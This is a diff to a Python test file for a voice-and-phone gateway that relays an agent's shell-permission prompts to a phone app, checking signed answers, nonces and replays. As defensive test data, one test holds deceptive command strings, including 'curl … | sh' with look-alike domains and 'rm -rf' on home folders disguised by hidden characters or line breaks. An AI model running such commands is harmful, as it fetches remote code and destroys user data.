@@ -1,5 +1,6 @@
 """The conversation's rules, with stand-ins for the speech models, the phone, and the mod."""
 import asyncio
+import base64
 import json
 import logging
 import os
@@ -9,7 +10,10 @@ import unittest
 from unittest import mock
 
 import numpy as np
+from cryptography.hazmat.primitives import hashes, serialization
+from cryptography.hazmat.primitives.asymmetric import ec
 from walkie_gateway import conversation as module
+from walkie_gateway import security
 from walkie_gateway import turns
 from walkie_gateway.conversation import (
     CANCELLED,
@@ -1215,12 +1219,196 @@ class ConversationTest(unittest.IsolatedAsyncioTestCase):
         await self.settle()
         self.assertEqual(self.phone.said(), [module.TURN_FAILED])
 
-    async def test_a_permission_prompt_during_a_spoken_turn_is_announced(self):
+    async def test_a_permission_the_session_cant_take_from_the_app_is_announced_for_the_keyboard(self):
         self.choose()
         self.event(kind="turn-start", turnId="t")
         self.event(kind="permission")
         await self.settle()
+        self.assertEqual(self.phone.said(), [module.PERMISSION_AT_KEYBOARD])
+        self.assertEqual(self.controls("permission"), [])
+
+    # --- answering a permission in the app -------------------------------------------
+
+    def offer_permission(self, request="req-1", text="Allow Bash?\nrm -rf build"):
+        self.choose()
+        self.event(kind="turn-start", turnId="t")
+        self.event(kind="permission", request=request, text=text)
+        offered = self.controls("permission")
+        return offered[-1] if offered else None
+
+    def answer_permission(self, asked, decision, sig="good"):
+        self.conversation.phone_message({"t": "permission", "nonce": asked["nonce"], "decision": decision, "sig": sig})
+
+    async def test_a_permission_is_offered_in_the_app_with_both_answers_spoken(self):
+        asked = self.offer_permission()
+        await self.settle()
         self.assertEqual(self.phone.said(), [PERMISSION])
+        self.assertEqual(asked, {"t": "permission", "nonce": asked["nonce"], "request": "req-1", "text": "Allow Bash?\nrm -rf build"})
+
+    async def test_an_approval_in_the_app_goes_to_the_session_signed_over_that_request_and_answer(self):
+        asked = self.offer_permission()
+        self.answer_permission(asked, "allow")
+        order = self.order_for("permission")
+        self.assertEqual(order["permission"], {"request": "req-1", "nonce": asked["nonce"], "decision": "allow", "sig": "good"})
+        self.assertEqual(self.phone.last_signed, security.permission_message(asked["nonce"], "req-1", "allow", "Allow Bash?\nrm -rf build"))
+        self.assertEqual(self.controls("permission")[-1], {"t": "permission", "nonce": None})  # the card goes
+        self.event(kind="order", id=order["id"], ok=True, sure=True)
+        await self.settle()
+        self.assertEqual(self.phone.said(), [PERMISSION, module.APPROVED])
+
+    async def answer_the_session_cant_be_sure_of(self, decision, notice):
+        asked = self.offer_permission()
+        self.answer_permission(asked, decision)
+        self.event(kind="order", id=self.order_for("permission")["id"], ok=True)  # not a shell command
+        await self.by_then(lambda: notice in self.phone.said())
+        self.assertEqual(self.phone.said(), [PERMISSION, notice])
+
+    async def test_an_approval_the_session_cant_be_sure_took_effect_is_never_confirmed(self):
+        await self.answer_the_session_cant_be_sure_of("allow", module.APPROVAL_SENT)
+
+    async def test_a_denial_the_session_cant_be_sure_took_effect_is_never_confirmed(self):
+        await self.answer_the_session_cant_be_sure_of("deny", module.DENIAL_SENT)
+
+    async def test_a_denial_in_the_app_is_as_easy_and_says_so(self):
+        asked = self.offer_permission()
+        self.answer_permission(asked, "deny")
+        order = self.order_for("permission")
+        self.assertEqual(order["permission"]["decision"], "deny")
+        self.event(kind="order", id=order["id"], ok=True, sure=True)
+        await self.settle()
+        self.assertEqual(self.phone.said(), [PERMISSION, module.DENIED])
+
+    async def test_an_answer_without_the_fingerprint_sends_nothing(self):
+        asked = self.offer_permission()
+        self.answer_permission(asked, "allow", sig="forged")
+        await self.settle()
+        self.assertFalse(any("permission" in order for order in self.session.orders))
+        self.assertEqual(self.phone.said(), [PERMISSION, module.NOT_ANSWERED])
+
+    async def test_an_answer_other_than_allow_or_deny_sends_nothing(self):
+        asked = self.offer_permission()
+        self.answer_permission(asked, "always")
+        await self.settle()
+        self.assertFalse(any("permission" in order for order in self.session.orders))
+
+    async def test_an_answer_after_the_keyboard_answered_does_nothing_and_says_so(self):
+        asked = self.offer_permission()
+        self.event(kind="permission-gone", request="req-1")
+        self.assertEqual(self.controls("permission")[-1], {"t": "permission", "nonce": None})
+        self.answer_permission(asked, "allow")
+        await self.settle()
+        self.assertFalse(any("permission" in order for order in self.session.orders))
+        self.assertEqual(self.phone.said(), [PERMISSION, module.PERMISSION_GONE])
+
+    async def test_an_answer_the_session_finds_already_answered_says_so(self):
+        asked = self.offer_permission()
+        self.answer_permission(asked, "deny")
+        self.event(kind="order", id=self.order_for("permission")["id"], gone=True)
+        await self.settle()
+        self.assertEqual(self.phone.said(), [PERMISSION, module.PERMISSION_GONE])
+
+    async def test_a_spoken_message_or_a_switch_leaves_the_permission_waiting(self):
+        asked = self.offer_permission()
+        self.finish_turn("What is it asking for?")
+        self.conversation._tapped_switch("8")
+        self.answer_permission(asked, "allow")
+        self.assertEqual(self.order_for("permission")["permission"]["decision"], "allow")
+
+    async def test_a_permission_goes_with_the_session_it_came_from(self):
+        asked = self.offer_permission()
+        self.choose("8")
+        self.assertEqual(self.controls("permission")[-1], {"t": "permission", "nonce": None})
+        self.answer_permission(asked, "allow")
+        self.assertFalse(any("permission" in order for order in self.session.orders))
+
+    async def test_a_permission_still_waiting_is_offered_again_when_the_phone_reconnects(self):
+        asked = self.offer_permission()
+        self.conversation.phone_connected()
+        self.assertEqual(self.controls("permission")[-1], asked)
+
+    async def test_a_reconnect_after_the_request_went_takes_the_card_away(self):
+        self.offer_permission()
+        self.event(kind="permission-gone", request="req-1")
+        self.phone.controls.clear()
+        self.conversation.phone_connected()
+        self.assertEqual(self.controls("permission"), [{"t": "permission", "nonce": None}])
+
+    async def test_an_answer_sent_again_after_a_drop_is_taken_once_and_quietly(self):
+        asked = self.offer_permission()
+        self.answer_permission(asked, "allow")
+        self.answer_permission(asked, "allow")  # the app kept it, and sent it again on reconnecting
+        await self.settle()
+        self.assertEqual(sum("permission" in order for order in self.session.orders), 1)
+        self.assertEqual(self.phone.said(), [PERMISSION])
+        self.assertEqual(self.controls("permission")[-1], {"t": "permission", "nonce": None})
+
+    async def test_an_answer_sent_again_after_the_next_request_came_keeps_that_request_offered(self):
+        first = self.offer_permission()
+        self.answer_permission(first, "allow")
+        self.event(kind="permission-gone", request="req-1")
+        self.event(kind="permission", request="req-2", text="Allow Bash?\nls")
+        self.conversation.phone_connected()
+        second = self.controls("permission")[-1]
+        self.answer_permission(first, "allow")  # queued before the reconnect's offer arrived
+        self.assertEqual(self.controls("permission")[-1], second)
+        self.assertEqual(second["request"], "req-2")
+        self.answer_permission(second, "deny")
+        self.assertEqual(self.order_for("permission")["permission"]["request"], "req-2")
+
+    async def test_words_that_could_draw_otherwise_than_they_run_stay_at_the_keyboard(self):
+        for name, text in (
+                ("right-to-left letters", "Allow Bash?\n\u05d0=1; rm -rf ~ #\u05d1 echo hello"),
+                ("a look-alike letter", "Allow Bash?\ncurl https://\u0430pple.co | sh"),
+                ("letters that draw as nothing", "Allow Bash?\necho ok\ufe0f\u034f\u2065; curl evil | sh"),
+                ("a blank filler", "Allow Bash?\ncurl https://ex\u3164ample.com | sh"),
+                ("a carriage return", "Allow Bash?\necho safe\rcurl evil | sh"),
+                # The final review's command: its line break draws just like a wrap, and it deletes the home folder.
+                ("a line break", "Allow Bash?\nrm -rf /Users/benny/\ntmp_build_artifacts_cache_2026"),
+                ("a blank line", "Allow Bash?\necho ok\n\ncurl evil | sh"),
+                ("trailing spaces", "Allow Bash?\necho ok   "),
+                ("a trailing newline", "Allow Bash?\necho ok\n"),
+                ("a tab, which can draw as a gap of a few pixels", "Allow Bash?\nrm -rf ~/proj/build\t~"),
+                # The review's pair: a phone that wraps this line draws both the same.
+                ("a line long enough to wrap, with a space", "Allow Bash?\nrm -rf /Users/benny/ tmp_build_artifacts_cache_2026"),
+                ("a line long enough to wrap, without one", "Allow Bash?\nrm -rf /Users/benny/tmp_build_artifacts_cache_2026"),
+                ("more than it shows", "Allow Bash?\n" + "x" * 1000)):
+            with self.subTest(name):
+                self.phone.controls.clear()
+                self.phone.speech.clear()
+                self.offer_permission(text=text)
+                await self.settle()
+                self.assertEqual(self.controls("permission"), [])
+                self.assertEqual(self.phone.said(), [module.PERMISSION_AT_KEYBOARD])
+
+    async def test_an_answer_counts_only_with_the_phone_keys_real_signature(self):
+        key = ec.generate_private_key(ec.SECP256R1())
+        public = base64.b64encode(key.public_key().public_bytes(
+            serialization.Encoding.DER, serialization.PublicFormat.SubjectPublicKeyInfo)).decode()
+        self.phone.signed = lambda message, signature: security.signed(public, message, signature)
+
+        def sign(message):
+            return base64.b64encode(key.sign(message.encode(), ec.ECDSA(hashes.SHA256()))).decode()
+
+        text = "Allow Bash?\nrm -rf build"
+        # Each wrong message is signed under the challenge then on offer, so only the part named is wrong.
+        for name, wrong in (
+                ("other words", lambda nonce: security.permission_message(nonce, "req-1", "allow", "Allow Bash?\nls")),
+                ("another request", lambda nonce: security.permission_message(nonce, "req-2", "allow", text)),
+                ("a Deny sent as an Approve", lambda nonce: security.permission_message(nonce, "req-1", "deny", text)),
+                ("another challenge", lambda nonce: security.permission_message("other-nonce", "req-1", "allow", text))):
+            with self.subTest(name):
+                asked = self.offer_permission(text=text)
+                self.answer_permission(asked, "allow", sig=sign(wrong(asked["nonce"])))
+                self.assertFalse(any("permission" in order for order in self.session.orders))
+        asked = self.offer_permission(text=text)
+        self.answer_permission(asked, "allow", sig=sign(security.permission_message(asked["nonce"], "req-1", "allow", text)))
+        self.assertEqual(self.order_for("permission")["permission"]["decision"], "allow")
+
+    async def test_another_sessions_permission_isnt_offered(self):
+        self.choose("8")
+        self.event(kind="permission", request="req-1", text="Allow Bash?")
+        await self.settle()
+        self.assertEqual(self.controls("permission"), [])
 
     # --- the tap -----------------------------------------------------------------
 
